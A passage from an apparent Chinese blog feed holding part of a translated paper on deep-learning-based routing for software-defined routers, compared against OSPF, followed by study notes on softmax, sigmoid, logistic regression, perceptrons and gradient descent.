1)$个边缘路由器的路径。我们可以使用矩阵$NR[N][N-I-1]$来保存这些DBA的结果，这些DBA可用于构建到所有其他边缘路由器的整个路径。表1是路由器$R_3$中内置的路由表，图2示出了构建从$R_3$到$R_{16}$的整个路径的过程的示例。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_06.png" width="80%"><h1 id="5-复杂性分析"><a href="#5-复杂性分析" class="headerlink" title="5. 复杂性分析"></a>5. 复杂性分析</h1><p>在本节中，我们分析了在所考虑的SDR上运行所提出的基于深度学习的路由策略的算法复杂度和时间成本。 我们的分析主要集中在训练阶段和运行阶段的算法复杂度的数值分析，通过计算加法运算的次数+，减法运算-，乘法运算×，除法运算÷，平方根运算$\sqrt{}$，指数运算$e^x$和否定操作。为了清楚地表达，每种操作的时间成本由ADD，SUB，MUL，DIV，SQRT，EXP和NEG表示。 然后，我们评估并比较在GPU和CPU上运行两个阶段的时间成本。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_07.png" width="80%"><h2 id="5-1-训练阶段的复杂性分析"><a href="#5-1-训练阶段的复杂性分析" class="headerlink" title="5.1 训练阶段的复杂性分析"></a>5.1 训练阶段的复杂性分析</h2><p>训练阶段的主要过程包括训练每个RBM并对算法1中所示的整个DBA进行微调。每个RBM的训练算法在算法3中示出，算法3是无监督的训练过程。 假设可见层和隐藏层中的单元数分别为$n_v$和$n_h$。 训练集的数量是$m$。 首先，从算法3的步骤1到步骤4，我们需要初始化$w$，$a$，$b$和$\Delta w$，$\Delta a$，$\Delta b$。 然后，我们重复利用所有训练样例来更新$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$的值，用CD的方法调整$w$，$a$，$b$ [30]。 如步骤7至步骤19所示，CD方法主要由两个周期组成。 第一个周期是采用吉布斯采样的方法，根据步骤7到步骤14所示的条件概率分布得到$h_j$和$v_i^{\prime}$的样本值。其次，获得的样本值$v_i^{\prime}$用于更新$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$，根据步骤15至步骤19。因此，$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$的值可用于更新步骤21至步骤25中所示的$w_{ji}$，$a_i$，$b_j$。整个训练过程重复$r_1$次，取$r_1((3m + 1)n_v n_h + 3mn_v + (2m + 1)n_h)ADD + r_1(mn_v n_h + (m + 1)n_v + mn_h)SUB + r_1((4m + 6)n_v n_h + n_v + n_h)MUL + r_1(2n_v n_h + (m + 1)n_v + mn_h)DIV + r_1 n_v n_h(EXP + NEG + SQRT)$</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于第一RBM的可见层满足3.2节中提到的高斯分布，为了训练第一个RBM，我们需要分别计算表示标准偏差和单位i的平均值的$\sigma_i$和$(a_i + \sigma\sum_j h_j w_{ji})$。 该步骤需要$2N(m - 1)\ ADD，Nm\ SUB，Nm\ MUL，2N\ DIV和N\ SQRT$操作。 还应注意，当训练第一RBM时，应将可见层的条件概率分布修改为等式15.第一RBM与其他RBM的时间成本的差异可忽略不计。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在完成第一步的复杂性分析之后，我们转向第二步，其采用等式18中定义的成本函数的随机梯度下降来微调权重和偏差的值。算法4中显示了第二步的详细过程，主要包括四个操作：前馈传递（步骤3到步骤11），反向传播（步骤12到步骤19），更新$w，b$的值（步骤20到步骤27），并计算成本函数（步骤29至步骤43）。如从步骤3到步骤11的前馈过程所示，计算每层中每个单元的加权值$z_j^{(l)}$和激活值$u_j^{(l)}$。这里选择的激活函数是$sigmoid$函数，然后$u_j^{(l)} = 1/(1 + e^{-z_j^{(l)}})$。因此，我们可以得到最后一层的误差$\delta_i^{(L)}$，它被定义为最后一层和标记输出的激活值之间的差异，如步骤13所示。作为最后一层中的单位值是第一层中单位的值逐层传播的结果，最后一层的误差是由先前层的误差引起的。步骤15至步骤19显示如何利用第$l^{th}$层的误差$\delta_i^{(l)}$，根据两层之间的关系计算第$(l - 1)^{th}$层的误差$\delta_i^{(l - 1)}$，这是一个向后传播过程。然后，根据步骤20到27，可以采用每层的误差$\delta_i^{(l)}$来更新$w，b$的值。在获得$w，b$的更新值之后，我们可以重新计算其值。成本函数$C$，其步骤从步骤29到43显示。然后，可以确认是否应该根据$C$的值执行新的迭代。如果我们假设算法迭代$r_2$次，则总时间成本是$r_2((4m + 1)\sum_{l = 2}^L n_l n_{l - 1} - mn_1 n_2 + m(\sum_{l = 2}^L n_l + 2n_L) + 1)ADD + r_2 m(2\sum_{l = 2}^L n_l n_{l - 1} - n_1 n_2 + \sum_{l = 2}^L n_l + 4n_L)SUB + r_2((8m + 1)\sum_{l = 2}^L n_l n_{l - 1} - mn_1 n_2 + m\sum_{l = 2}^L n_l + 2mn_L + 1)MUL + r_2(2\sum_{l = 2}^L n_l + 2)DIV$</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_08.png" width="80%"><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在获得用于训练每个DBA的不同操作数的数量之后，我们理论上可以分析利用GPU（Nvidia Titan X Pascal）或价格可比较的CPU（Intel i7-6900K）来执行计算的时间成本。 GPU，Titan X，有28个SM，每个SM可以在一个时钟周期内运行128次32位浮点运算。 CPU，Intel i7-6900K，有8个内核和16个线程。我们选择的不同算术操作数的延迟分别为$ADD/SUB，MUL和DIV$操作的3个，5个和15个时钟周期[35]。由于$EXP，SQRT和NEG$操作数的数量远少于其他操作数的数量，因此忽略这些操作数EXP，SQRT和NEG的时间成本是合理的。训练样本的数量是100000$(m = 100000)$，并且$r_1$和$r_2$的值都假设为10000。然后，我们可以计算在GPU和CPU上运行的算法的时间成本值，如图5所示。可以发现基于GPU的SDR的时间成本的对数值小于2小而不是基于CPU的。这表明基于GPU的SDR用于训练所提出的深度学习架构，其性能比基于CPU的SDR快100多倍。尽管当路由器数量为1000时基于GPU的SDR的时间成本超过1000秒，但SDR的训练阶段可以离线操作以避免网络性能下降。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_09.png" width="80%"> - 图5：所选GPU和基于CPU的SDR的培训阶段的时间成本 <img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_10.png" width="80%"> - 图6：所选GPU和基于CPU的SDR的运行阶段的时间成本<h2 id="5-2-运行阶段的复杂性分析"><a href="#5-2-运行阶段的复杂性分析" class="headerlink" title="5.2 运行阶段的复杂性分析"></a>5.2 运行阶段的复杂性分析</h2><p>在本节中，我们将分析在运行阶段提出的路由策略的时间成本。如上所述，训练阶段可以被视为SDR的初始化时段。因此，SDR主要在运行阶段工作。运行阶段的详细过程是前馈传播，可以认为与算法4中的步骤3到11相同。如前面第4.3节所述，运行阶段仅在边缘路由器中执行，并且每个边缘路由器仅构造从自身到所有其他边缘路由器的路径。因此，在运行阶段，每个边缘路由器只需要运行DBA，DBA计算其路径中存在的下一个节点。由于一条路径中路由器数量的不确定性，有必要假设一条路径中的平均节点数为A.因此，每个边缘路由器都需要运行$(N-I-1)A\ DBAs$。因此，每个边缘路由器构造其路径的时间成本是$(N - 1 - 1)A \sum_{l = 2}^L n_l(n_{l-1} + 1)ADD + (N - I - 1)A \sum_{l = 2}^L n_l n_{l - 1} MUL + (N - I - 1)A \sum_{l = 2}^L n_l(DIV + EXP + NEG)$。</p><p>然后，我们可以计算所选GPU和基于CPU的SDR上运行阶段的时间成本值，如图6所示.$A$的值设置为$0.2N$。 由于GPU的时间成本的对数值比CPU的时间成本小约2，因此使用GPU比使用基于CPU的SDR运行算法快约100倍。 我们可以发现，当路由器的数量小于400时，GPU的时间成本小于1毫秒，而CPU的时间成本大于100毫秒。 这表明所提出的基于深度学习的路由策略在GPU加速SDR中运行得非常快。</p><p>除了复杂性分析之外，在下一节中，我们还进一步提出了基于仿真的网络性能评估，该评估基于商用路由器构建的骨干网上我们提出的基于深度学习的路由技术。</p><h1 id="6-网络性能评估"><a href="#6-网络性能评估" class="headerlink" title="6. 网络性能评估"></a>6. 网络性能评估</h1><p>本节评估了我们提出的基于深度学习的路由策略在网络性能方面的有效性。为了适应我们对输入和输出的表征，使用了C ++ / WILL-API [16]，因为它提供了DBA库，这在其他模拟器中是不可用的，例如Caffe和Microsoft Cognitive Toolkit [36]。因此，我们使用C ++ / WILL-API作为仿真框架。在模拟中，所有路由器的计算都在具有六核i7 3.3 Ghz处理器和16 GB RAM的工作站上进行。由于我们考虑的网络中所有路由器的计算都外包给一台机器，因此将模拟限制在小型网络是合理的。因此，我们考虑如图2所示的中型有线骨干网络，而不是全尺寸核心网络拓扑。值得注意的是，这种模拟规模足以证明所提出的基于深度学习的路由策略优于诸如OSPF的传统路由策略。如第3.1节所述，只有边缘路由器生成数据包，这些数据包发往边缘路由器，而内部路由器只转发数据包。另一方面，所有路由器都可以生成信令包。此外，信令数据包由流量模式组成，并且发往我们提案中的边缘路由器，而所有路由器都使用OSPF信令数据包来交换OSPF协议中的路由表。数据包和信令包的大小设置为1 kb。链路容量设置为20 Gbps。在这里，我们假设每个路由器都有一个无限的缓冲区。如前所述，我们需要使用DBA的监督培训，培训数据应包括流量数据和后续节点。然而，公共网站[34]提供的最实际的流量跟踪包括混合的路由协议，这些协议很难用于监督培训。此外，由于本文的目的是评估将深度学习应用于路由的性能，因此选择现有的路由协议作为仿真的基准是合理的。由于实际交通数据来自使用混合路由协议的网络，如果我们使用数据来训练我们的深度学习架构，那么将所提出的路由策略的性能与我们考虑的基准路由协议进行比较是不公平的。因此，在我们的模拟中，我们首先运行OSPF协议，在所考虑的网络中构建路由表，并记录流量模式和相应的路径。因此，我们可以利用记录的流量模式和相应的路径来构建标记数据，以便在训练阶段训练DBA。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_11.png" width="80%"> - 图7：不同DBA的均方误差（MSEs）。<p>在本节中，我们首先评估给定核心网络的DBA的精度，然后我们决定隐藏层的数量和每个隐藏层所需的单元数。 我们还对输入和输出的不同特征描述策略进行了比较，并证明我们的提议具有最高的精度和最低的复杂性。 然后，从三个方面将我们提出的路由策略的网络性能与OSPF的网络性能进行比较，即信令开销，网络吞吐量和每跳的平均延迟。</p><h2 id="6-1-DBA精度分析"><a href="#6-1-DBA精度分析" class="headerlink" title="6.1 DBA精度分析"></a>6.1 DBA精度分析</h2><p>由于图2所示网络中的路由器数量为16，因此对于每个DBA，输入和输出层中的单元数均为16.在我们的模拟中，训练数据的数量为100,000。 为了确定每个DBA的隐藏层数和每个隐藏层中的单元数，我们培训不同的DBA。 测量DBA的预测误差率的均方误差（MSE）在图7中给出。可以注意到，由每层中的4层和16或18个单元组成的DBA具有最小的MSE值。 考虑到隐藏层中的更多单元意味着更复杂，我们选择DBA，其中每个隐藏层具有2个隐藏层和16个单元。</p><p>为了阐明我们提出的深度学习系统模型的输入和输出，请参考表2.该表给出了具有16个路由器的网络中五个结构的错误率。第一行表示集中式路由控制。输入是16个路由器的最后时间间隔中的流量模式，而输出给出网络中任何两个边缘路由器之间的整个路径。我们可以发现输出层中的单元数超过30,000，其结构变得极其复杂，导致精度差。以下两行中显示的结构都使用一个深度学习系统来输出整个路径。它们之间的主要区别如下。第二种结构使用16×16矩阵来显示路径，矩阵中的元素具有二进制值。另一方面，第三结构输出向量，其中一些元素的值表示在路径中选择的路由器。我们可以发现第二和第三结构的错误率分别高达70％和45％。如果我们选择下一个节点作为最后两行中指示的输出，我们可以发现错误率仅为5％。这两种结构使用我们提出的输入和输出模型，第四种结构使用仅1个时间间隔的流量模式，而最终结构使用三个时间间隔的流量模式作为输入。两个结构中的输出层均由16个单元组成，并输出16维向量，其中只有一个元素的值为1表示路径中的下一个路由器。尽管这两种结构具有相同的性能，但最终结构比第四种结构复杂得多，因为输入层中的单元更多。因此，与其他策略相比，我们选择的第四种结构具有最低的错误率和最简单的结构。</p><h2 id="6-2-网络性能分析"><a href="#6-2-网络性能分析" class="headerlink" title="6.2 网络性能分析"></a>6.2 网络性能分析</h2><p>在运行阶段，我们选择OSPF作为基准方法来比较所提出的基于深度学习的路由策略。为了比较各种网络负载下的性能，我们更改数据生成速率并记录网络信令开销，吞吐量和每跳平均延迟的值。信令间隔固定为0.25秒。图8（a）和图8（b）比较了当数据生成速率从1.44Gbps变为2.208Gbps时成功传送的信令分组的数量和网络吞吐量与两种路由策略。图8（c）比较了当数据生成速率从1.5168 Gbps增加到1.5744 Gbps时两种情况下每跳平均延迟的变化。在图8（a）中，我们可以发现在我们的提议中成功传送的信令分组的数量几乎保持不变，这是正常的，因为信令间隔和模拟时间都是固定的。然而，在使用传统OSPF协议的网络中，当数据生成速率大于1.536Gbps时，成功传送的信令分组的数量逐渐减少，这可以通过业务拥塞和随后增加的一些信令分组的丢失来解释。可以注意到，传统情况下的信令分组的数量远远高于我们的提议中的数量。这是因为在我们的提议中，每个路由器只需要将信令数据包发送到边缘路由器以计算路由路径，而在OSPF中，每个路由器都需要将信令数据包泛洪到网络中的所有其他路由器。信令分组数量的差异会影响网络吞吐量和每跳的平均延迟。图8（b）表明我们提案的吞吐量随数据生成速率线性增加。但是，在使用OSPF的网络中，吞吐量在数据生成速率达到1.536 Gbps之前线性增加，之后吞吐量增长相当缓慢。在图8（c）中更清楚地示出了两种路由策略中的性能差异，其示出了随着网络开销的增加，每跳的平均延迟的变化。可以观察到，当数据生成速率低于1.5456 Gbps时，由于我们的提议中的DBA使用来自OSPF的数据进行训练，因此两种情况下每跳的平均延迟几乎相同。因此，可以得出结论，我们的DBA培训是成功的，因为它可以提供与OSPF相同的输出。但是，在数据生成速率超过1.5456 Gbps之后，OSPF中每跳的平均延迟增加，而我们的提议仍然不受影响。这可以通过交通拥堵的发生来解释，当使用OSPF的网络中的数据生成速率高于1.5456 Gbps时，导致吞吐量降低并且每跳的平均延迟增加。相反，对于所示的数据生成速率，基于深度学习的所提出的路由策略实现了低得多的信令开销并且避免了业务拥塞问题。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_02_18_01.png" width="80%"> - 图8：在信令开销，吞吐量和每跳平均延迟方面，我们的提议和基准方法（OSPF）中不同网络负载下的网络性能比较。 <img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_02_18_02.png" width="80%"> - 图9：在信令开销，吞吐量和每跳平均延迟方面，我们的提议和基准方法（OSPF）中不同信令间隔下的网络性能比较。<p>在利用各种数据生成速率分析网络性能之后，我们使用两种不同的路由策略进一步分析和比较不同信令开销对网络性能的影响。在这里，我们将数据生成速率固定为1.536 Gbps，并将信令间隔从260 ms更改为240 ms。图图9示出了当信令间隔分别为260ms，250ms和240ms时两种情况下的信令开销，吞吐量和每跳平均延迟的结果。在图9（a）中，我们可以发现我们的提议中的信令开销远低于OSPF的情况。在图中如图9（b）和9（c）所示，我们可以清楚地看到信令开销对两种情况的性能的影响。在图9（b）中，当信令间隔不同时，我们的提议的吞吐量几乎保持不变。另一方面，当信令间隔为240ms时，OSPF的吞吐量远低于信令间隔为260ms或250ms时的吞吐量。因此，可以推断当信令间隔是240ms时，使用OSPF对网络发生业务拥塞。图9（c）中的结果进一步证明了这一点，该结果表明，当信令间隔为240ms时，OSPF的每跳平均延迟几乎是信令间隔为260ms或250ms时的两倍。此外，我们可以发现，当信令间隔为260 ms或250 ms时，OSPF的每跳平均延迟几乎与我们的提议相同。</p><p>通过比较使用OSPF的网络性能和我们提出的基于深度学习的路由策略，我们可以发现我们提出的基于深度学习的路由策略具有更低的信令开销，从而实现更好的流量控制。我们的提议中信令开销较低的原因是只有边缘路由器而不是所有路由器都需要信令数据包，因为边缘路由器可以使用训练有素的DBA来构建整个路径，而内部路由器不需要信令数据包来计算下一个节点。但是，在具有OSPF的网络中，边缘路由器不能利用所有链路的当前权值来构建实际的整个路径，因为通过OSPF计算的路径仅适用于当前网络状态。但是在数据包传输过程中，网络流量正在发生变化，然后决定的路径变得不合适。另一方面，对于基于深度学习的路由策略，如果我们利用流量模式和实际路径来训练它们，DBA可以找到当前流量模式和真实路径之间的复杂关系。因此，边缘路由器可以利用训练有素的DBA来构建仅具有当前网络信息的整个路径。</p><h1 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本文中，我们解释了重新思考核心路由器架构和骨干网络路由策略的重要性，以满足不断变化的网络需求并应对未来几天的大量流量增长。在这种情况下，我们探索了当前的SDR架构，并设想深度学习（最近作为一种有前途的机器学习技术出现）可用于计算路由路径而不是传统的路由协议。这可以大大改善骨干网络流量控制。考虑到当前GPU加速的SDR实现了大规模并行计算，我们提出了一种监督深度学习系统来利用流量模式直接计算路径，这与传统的基于规则的路由不同。仿真结果表明，所提出的基于深度学习的路由策略在网络分组传输吞吐量和每跳平均延迟方面优于传统OSPF，因为我们的提议具有低得多的信令开销。这表明路由计算从传统的基于规则的策略向深度学习的转变可以大大改善骨干网络控制。此外，我们分析了我们提出的路由策略的复杂性，以评估GPU加速的SDR比基于CPU的SDR更有效地运行所提出的算法。由于各种终端接入网络以获得不同类型的服务，我们未来的研究将尝试应用深度学习技术来建模多个网络指标之间的复杂关系，以便更好地进行路由路径管理。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>机器学习中的算法笔记</title>
    <url>/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/</url>
    <content><![CDATA[<h1 id="机器学习的函数介绍"><a href="#机器学习的函数介绍" class="headerlink" title="机器学习的函数介绍"></a>机器学习的函数介绍</h1><h2 id="softmax函数"><a href="#softmax函数" class="headerlink" title="softmax函数"></a>softmax函数</h2><h3 id="函数形式"><a href="#函数形式" class="headerlink" title="函数形式"></a>函数形式</h3><p>$$ S_i = \frac{e^{V_i}}{\sum\nolimits_{i}^{C}e^{V_i}} $$</p><p>其中， $ V_i $ 是分类器前级输出单元的输出。$ i $ 表示类别索引，总的类别个数为 $ C $ 。$ S_i $ 表示的是当前元素的指数与所有元素指数和的比值。Softmax 将多分类的输出数值转化为相对概率，更容易理解和比较。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>一个多分类问题，C = 4。线性分类器模型最后输出层包含了四个输出值，分别是：</p><p>$$ V = \begin{bmatrix} -3 \\ 2 \\ -1 \\ 0 \end{bmatrix} $$</p><p>经过Softmax处理后，数值转化为相对概率：</p><p>$$ S = \begin{bmatrix} 0.0057 \\ 0.8390 \\ 0.0418 \\ 0.1135 \end{bmatrix} $$</p><p>很明显，Softmax 的输出表征了不同类别之间的相对概率。我们可以清晰地看出，$ S_1 = 0.8390 $ ，对应的概率最大，则更清晰地可以判断预测为第2类的可能性更大。Softmax 将连续数值转化成相对概率，更有利于我们理解。</p><h2 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h2><h3 id="函数形式-1"><a href="#函数形式-1" class="headerlink" title="函数形式"></a>函数形式</h3><p>$$ \sigma(x) = \frac{1}{1 + e^{-x}} $$</p><p>该函数的导数形式非常简单，为：</p><p>$$ \begin{aligned}<br>\sigma(x)’ &amp; = (\frac{1}{1 + e^{-x}})’ \\<br>&amp; = -\frac{-e^{-x}}{(1 + e^{-x})^2} \\<br>&amp; = \frac{1}{1 + e^{-x}} - \frac{1}{(1 + e^{-x})^2} \\<br>&amp; = \sigma(x)(1 - \sigma(x))<br>\end{aligned} $$</p><h3 id="函数性质"><a href="#函数性质" class="headerlink" title="函数性质"></a>函数性质</h3><p>函数图像</p><img src="/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/2018_12_26_03.png"><p>函数值域为 $ (0, 1) $ ，用于将神经元的输出归一化，便于做二分类问题。在机器学习领域，将输出的值从 $ (-\infty, +\infty) $ 归一化到 $ (0, 1) $ 中，对于许多分类问题都是很好的函数，比如逻辑回归。</p><h1 id="传统机器学习算法"><a href="#传统机器学习算法" class="headerlink" title="传统机器学习算法"></a>传统机器学习算法</h1><h2 id="逻辑回归-Logistics-Regression"><a href="#逻辑回归-Logistics-Regression" class="headerlink" title="逻辑回归 Logistics Regression"></a>逻辑回归 Logistics Regression</h2><h3 id="函数形式和模型"><a href="#函数形式和模型" class="headerlink" title="函数形式和模型"></a>函数形式和模型</h3><p>$$ \hat{y} = sigmoid(W^T X) = \frac{1}{1 + e^{-W^T X}} $$</p><ul><li>函数输出为0到1之间的一个数，对于二分类问题可以理解为预测值为1的概率</li><li>使用时需要选定一个<strong>阈值</strong>来决定二分类问题，一般取0.5</li><li>二元逻辑回归就是sigmoid神经元</li></ul><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>首先，对于一个样本 $ i $ 估计正确的概率为</p><p>$$ p_i = \hat{y_i}^{y_i} (1 - \hat{y_i})^{1 - y_i} = \left\{\begin{array}{cl}<br>\hat{y_i} &amp; y_i = 1 \\<br>1 - \hat{y_i} &amp; y_i = 0<br>\end{array}\right. $$</p><p>$ \hat{y_i} $ 为预测值， $ y_i $ 为实际值</p><p>对于一组样本，期望全部正确，使用<strong>最大似然估计</strong>——即将所有概率相乘得到概率</p><p>$$ p = \prod_{i} \hat{y_i}^{y_i} (1 - \hat{y_i})^{1 - y_i} $$</p><p>方便计算，将乘法转化成为加法，左右取log</p><p>$$ log(p) = \sum_{i} [y_i log (\hat{y_i}) + (1 - y_i) log (1 - \hat{y_i})] $$</p><p>期望这个数越大越好，但是一般计算取越小越好更方便，加上负号</p><p>$$ l = \sum_{i} [-y_i log (\hat{y_i}) - (1 - y_i) log (1 - \hat{y_i})] $$</p><p>即为逻辑回归损失函数</p><h3 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h3><p>使用<a href="#gradient">梯度下降算法</a>，求</p><p>$$ \begin{aligned}<br>\frac{\partial W^T X}{\partial w_i} &amp; = \frac{\partial \sum_{i} w_i x_i}{\partial w_i} = x_i, \\<br>\frac{\partial l}{\partial w_i} &amp; = \sum_{i} [-y_i \frac{\partial log (\hat{y_i})}{\partial w_i} - (1 - y_i) \frac{\partial log (1 - \hat{y_i})}{\partial w_i}] \\<br>&amp; = \sum_{i} [-y_i \frac{\frac{-1}{(1 + e^{-W^T X})^2} \cdot (-x_i e^{-W^T X})}{\frac{1}{1 + e^{-W^T X}}} - (1 - y_i) \frac{- \frac{-1}{(1 + e^{-W^T X})^2} \cdot (-x_i e^{-W^T X})}{1 - \frac{1}{1 + e^{-W^T X}}}] \\<br>&amp; = \sum_{i} [\frac{-y_i x_i e^{-W^T X}}{1 + e^{-W^T X}} + \frac{(1 - y_i) x_i}{1 + e^{-W^T X}}] \\<br>&amp; = \sum_{i} (\frac{x_i}{1 + e^{-W^T X}} - y_i x_i) \\<br>&amp; = \sum_{i} [(\hat{y_i} - y_i)x_i]<br>\end{aligned} $$</p><h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><h2 id="感知器（神经元）"><a href="#感知器（神经元）" class="headerlink" title="感知器（神经元）"></a>感知器（神经元）</h2><ul><li>神经网络的组成单元——神经元。</li><li>神经元也叫做感知器。</li><li>神经元和感知器的不同在于神经元的激活函数为 $ sigmoid $ 函数</li></ul><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><img src="/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/2018_12_24_01.png"><h3 id="函数形式-2"><a href="#函数形式-2" class="headerlink" title="函数形式"></a>函数形式</h3><ul><li><strong>输入权值</strong> 一个感知器可以接收多个<strong>输入</strong> $ (x_1, x_2, …, x_n | x_i \in R) $，每个输入上有一个<strong>权值</strong> $ w_i \in R $，此外还有一个<strong>偏置项</strong> $ b \in R $ 。</li><li><strong>激活函数</strong> 感知器的激活函数可以有很多选择，比如我们可以选择下面这个<strong>阶跃函数</strong> $ f $ 来作为激活函数：<br>$$ f(z) = \left\{\begin{array}{ll}<br>1 &amp; {z &gt; 0} \\<br>0 &amp; otherwise<br>\end{array}\right. $$</li><li><strong>输出</strong> 感知器的输出用下面的公式计算<br>$$ y = f(w \cdot x + b) $$</li></ul><h3 id="训练神经元"><a href="#训练神经元" class="headerlink" title="训练神经元"></a>训练神经元</h3><p>感知器规则</p><p>$$ w_i \leftarrow w_i + \Delta w_i \\<br>b \leftarrow b + \Delta b $$</p><p>其中</p><p>$$ \Delta w_i = \eta(t - y)x_i \\<br>\Delta b = \eta(t - y) $$</p><ul><li>$ t $ 为训练样本的实际值，也就是label</li><li>$ y $ 为感知器输出值</li><li>$ \eta $ 为学习速率，也就是rate</li></ul><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>python编写感知器实现and运算符</p><p>Github: <a href="https://github.com/Githubwyb/zeroDeepLearning/tree/master/1.Perceptron" target="_blank" rel="noopener">https://github.com/Githubwyb/zeroDeepLearning/tree/master/1.Perceptron</a></p><h2 id="线性单元"><a href="#线性单元" class="headerlink" title="线性单元"></a>线性单元</h2><h3 id="模型-1"><a href="#模型-1" class="headerlink" title="模型"></a>模型</h3><img src="/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/2018_12_25_02.png"><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>与感知器一致，仅仅将激活函数改为线性函数 $ f(x) = x $</p><h3 id="训练线性单元"><a href="#训练线性单元" class="headerlink" title="训练线性单元"></a>训练线性单元</h3><h4 id="目标函数"><a href="#目标函数" class="headerlink" title="目标函数"></a>目标函数</h4><p>线性单元所要达到的目标是预测结果和实际结果相同，可以定义单个样本误差为：</p><p>$$ e = \frac{1}{2}(y - \bar y)^2 = \frac{1}{2}(y - w \cdot x)^2 $$</p><p>其中 $ y $ 为实际值，$ \bar y $ 为预测值。线性单元的目标为使 $ e $ 达到最小。</p><p>实际情况中，样本有很多个，需要使一批样本的误差达到最小，定义整体误差 $ E $ ：</p><p>$$ \begin{aligned}<br>E &amp; = e_1 + e_2 + … + e_n \\<br>&amp; = \frac{1}{2}\sum_{i = 1}^{n}(y_i - \bar y_i)^2 \\<br>&amp; = \frac{1}{2}\sum_{i = 1}^{n}(y_i - w_i \cdot x_i)^2<br>\end{aligned} $$</p><p>训练线性单元目的即为将 $ E $ 变为最小</p><h4 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a><span id="gradient">梯度下降算法</span></h4><p>为使整体误差下降到最小，需要改变 $ w $ 使预测值更接近于真实值。可以定义整体误差 $ E $ 为 $ w $ 的函数，利用梯度的方法使整体误差取极小值点。由于计算机没办法计算梯度，但是计算能力强大，可以使用尝试法接近极小值。引入渐进到极小值及<strong>梯度下降算法</strong>的公式，对每个 $ w $ 来说：</p><p>$$ w_{new} = w_{old} - \eta\nabla E(w_{old}) $$</p><p>对于 $ \nabla E $ ，有：</p><p>$$ \begin{aligned}<br>\nabla E(w) &amp; = \frac{1}{2}\sum_{i = 1}^{n}\frac{\partial}{\partial w}(y_i - \bar{y_i})^2 \\<br>&amp; = \frac{1}{2}\sum_{i = 1}^{n}\frac{\partial}{\partial w}(y_i - w \cdot x)^2 \\<br>&amp; = \frac{1}{2}\sum_{i = 1}^{n}[- 2(y_i - w \cdot x)x] \\<br>&amp; = -\sum_{i = 1}^{n}(y_i - \bar{y_i})x \\<br>\end{aligned} $$</p><p>所以，训练线性单元的规则为：</p><p>$$ w \leftarrow w + \eta\sum_{i = 1}^{n}(y_i - \bar{y_i})x $$</p><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>python编写线性单元实现线性预测</p><p>Github: <a href="https://github.com/Githubwyb/zeroDeepLearning/tree/master/2.LinearUnit" target="_blank" rel="noopener">https://github.com/Githubwyb/zeroDeepLearning/tree/master/2.LinearUnit</a></p><h2 id="神经网络和反向传播算法"><a href="#神经网络和反向传播算法" class="headerlink" title="神经网络和反向传播算法"></a>神经网络和反向传播算法</h2><h3 id="神经元"><a href="#神经元" class="headerlink" title="神经元"></a>神经元</h3><p>神经元就是将感知器的激活函数更改为 $ sigmoid $ 函数：</p><img src="/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/2018_12_26_05.png"><h3 id="神经网络-1"><a href="#神经网络-1" class="headerlink" title="神经网络"></a>神经网络</h3><img src="/2018/12/21/2018-12-21-machineLearningAlgorithmNotes/2018_12_26_04.png"><p>神经网络包含输入层、隐藏层和输出层，隐藏层可以有多层神经元构成，每一层神经元的输入为上一层神经元的输出。</p><p>上图所示的隐藏层只有一层，公式为：</p><p>$$ a_4 = sigmoid(w_{41}x_1 + w_{42}x_2 + w_{43}x_3 + w_{44}x_4 + w_{4b}) \\<br>a_5 = sigmoid(w_{51}x_1 + w_{52}x_2 + w_{53}x_3 + w_{54}x_4 + w_{5b}) \\<br>a_6 = sigmoid(w_{61}x_1 + w_{62}x_2 + w_{63}x_3 + w_{64}x_4 + w_{6b}) \\<br>a_7 = sigmoid(w_{71}x_1 + w_{72}x_2 + w_{73}x_3 + w_{74}x_4 + w_{7b}) $$</p><p>输出层为和输出 $ y $ 同维度的神经元组成，公式同上。</p><h3 id="神经网络的训练"><a href="#神经网络的训练" class="headerlink" title="神经网络的训练"></a>神经网络的训练</h3><p>现在，我们需要知道一个神经网络的每个连接上的权值是如何得到的。我们可以说神经网络是一个<strong>模型</strong>，那么这些权值就是模型的<strong>参数</strong>，也就是模型要学习的东西。然而，一个神经网络的连接方式、网络的层数、每层的节点数这些参数，则不是学习出来的，而是人为事先设置的。对于这些人为设置的参数，我们称之为<strong>超参数(Hyper-Parameters)</strong>。</p><h4 id="反向传播算法"><a href="#反向传播算法" class="headerlink" 